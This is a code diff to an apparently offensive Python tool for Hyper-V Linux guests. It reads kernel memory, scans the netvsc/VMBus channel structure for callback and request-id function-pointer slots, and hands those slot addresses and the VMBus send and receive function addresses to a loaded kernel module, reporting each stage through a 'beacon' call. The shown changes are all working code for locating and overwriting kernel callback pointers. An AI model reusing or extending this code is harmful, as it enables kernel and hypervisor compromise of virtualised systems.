@@ -117,7 +117,13 @@ def netvsc_nvdev(kcore, channel):
     context_channel, nvdev = struct.unpack("<QQ", kcore.read(context, 16))
     if context_channel != channel:
         raise RuntimeError("netvsc context mismatch")
-    return nvdev
+    request_id_callback = symbol_address("vmbus_next_request_id")
+    request_hits = [offset for offset in range(0, len(channel_data) - 8, 8)
+                    if struct.unpack_from("<Q", channel_data, offset)[0]
+                    == request_id_callback]
+    if len(request_hits) != 1:
+        raise RuntimeError("request-id callback hits=%r" % request_hits)
+    return nvdev, hits[0], request_hits[0]
 
 
 def write_param(name, value):
@@ -185,10 +191,12 @@ def main():
         relid, device_dir = netvsc_primary_relid()
         kcore = KCore()
         channel = channel_for_relid(kcore, relid)
-        nvdev = netvsc_nvdev(kcore, channel)
+        nvdev, callback_offset, request_id_offset = netvsc_nvdev(kcore, channel)
         nvsp_version = struct.unpack("<I", kcore.read(nvdev, 4))[0]
         result.update({"relid": relid, "channel": hex(channel), "device": os.path.basename(device_dir)})
-        result.update({"nvdev": hex(nvdev), "nvsp_version": hex(nvsp_version)})
+        result.update({"nvdev": hex(nvdev), "nvsp_version": hex(nvsp_version),
+                       "callback_offset": hex(callback_offset),
+                       "request_id_offset": hex(request_id_offset)})
         beacon({**result, "status": "channel_resolved"})
 
         send_fn = symbol_address("vmbus_sendpacket")
@@ -208,6 +216,9 @@ def main():
             return
         beacon({**result, "status": "module_loaded"})
         write_param("channel", hex(channel))
+        write_param("callback_slot", hex(channel + callback_offset))
+        write_param("context_slot", hex(channel + callback_offset + 8))
+        write_param("request_id_slot", hex(channel + request_id_offset))
         write_param("send_fn", hex(send_fn))
         write_param("recv_fn", hex(recv_fn))
         write_param("wait_ms", 1500)
